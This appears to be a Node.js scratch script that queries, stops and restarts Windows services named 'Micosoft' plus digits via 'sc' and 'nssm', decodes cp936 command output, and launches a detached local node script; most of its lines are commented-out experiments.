const { exec, execSync, spawn, spawnSync, fork } = require("child_process");
const icv = require("iconv-lite");
const { isServiceStopped, waitForServiceStatus } = require("./status");
const { NSSM_PATH, INSTALL_PATH } = require("../../my_config");

// function myExec(data, emitCmdResult = true, callback = (result) => {}) {
//   let result;
//   exec(data, { encoding: "binary" }, (error, stdout, stderr) => {
//     // console.log(stdout);
//     try {
//       if (error) throw error;
//       result = icv.decode(Buffer.from(stdout, "binary"), "cp936");
//       callback(result);
//     } catch (error) {
//       // debug(`Exec error occured!\n`);
//       // debug(details(error));
//       // debug(icv.decode(Buffer.from(stderr, "binary"), "cp936"));
//       result = icv.decode(Buffer.from(stderr, "binary"), "cp936");
//     }
//     if (emitCmdResult) {
//       // io.emit("cmdresult", result);
//     }
//   });
// }

// let result = myExec("sc query|findstr Micos", true, (result) => {
//   let a = /SERVICE_NAME: (.*)/.exec(result);
//   if (a) {
//     console.log(a[1]);
//   } else {
//     console.log("not found");
//   }
// });

// console.log(
//   icv.decode(
//     Buffer.from(
//       execSync("sc query|findstr Micos", {
//         encoding: "binary",
//       }),
//       "binary"
//     ),
//     "cp936"
//   )
// );

function sleep(msec) {
  return new Promise((r) => {
    setTimeout(() => {
      console.log("sleep");
      r();
    }, msec);
  });
}
var a = 0;
async function checkServiceStatus(serviceName, status) {
  while (a++ < 3) {
    await sleep(1000);
  }
}

// function main() {
//   setTimeout(async () => {
//     await checkServiceStatus();
//     console.log("hello");
//   }, 1000);
// }

// main();
// if (isServiceStopped("Micosoft4568")) {
//   console.log(true);
// } else {
//   console.log(false);
// }
function myExec(data, emitCmdResult = true, callback = () => {}) {
  let result;
  exec(data, { encoding: "binary" }, (error, stdout, stderr) => {
    // console.log(stdout);
    try {
      if (error) throw error;
      callback();
      result = icv.decode(Buffer.from(stdout, "binary"), "cp936");
    } catch (error) {
      // debug(`Exec error occured!\n`);
      // debug(details(error));
      // debug(icv.decode(Buffer.from(stderr, "binary"), "cp936"));
      result = icv.decode(Buffer.from(stderr, "binary"), "cp936");
    }
    if (emitCmdResult) {
      // io.emit("cmdresult", result);
      console.log(result);
    }
  });
}

// console.log(execSync(`${NSSM_PATH} stop Micosoft43979`).toString());
// spawnSync("nssm", ["stop", "Micosoft71494"], { shell: true });
// execSync(`nssm stop Micosoft71494`, { shell: true, });

// let p = spawn(
//   `sc`,
//   [
//     "stop",
//     "Micosoft71494",
//     "&&",
//     "timeout",
//     "3",
//     "&&",
//     "sc",
//     "start",
//     "Micosoft71494",
//   ],
//   { windowsVerbatimArguments: true, detached: true, stdio: "ignore" }
// );
// p.unref();

// try {
//   execSync(`sc stop Micosoft71494 && timeout 3 && sc start Micosoft71494`, {
//     shell: true,
//     encoding: "binary",
//   });
// } catch (error) {
//   icv.decode(Buffer.from(error, "binary"), "cp936");
//   console.log(icv.decode(Buffer.from(error, "binary"), "cp936"));
// }
(async () => {
  // fork(`${INSTALL_PATH}tmpDir/tmp1.js`, { detached: true });
  // await sleep(1000);
  // fork(`${INSTALL_PATH}tmpDir/tmp2.js`, { detached: true });
  // fork(`${INSTALL_PATH}tmpDir\\tmp.js`, {
  //   detached: true,
  // });
  let p = spawn("node", [`${INSTALL_PATH}tmpDir\\tmp.js`], {
    detached: true,
    stdio: "ignore",
  });
  p.unref();
})();
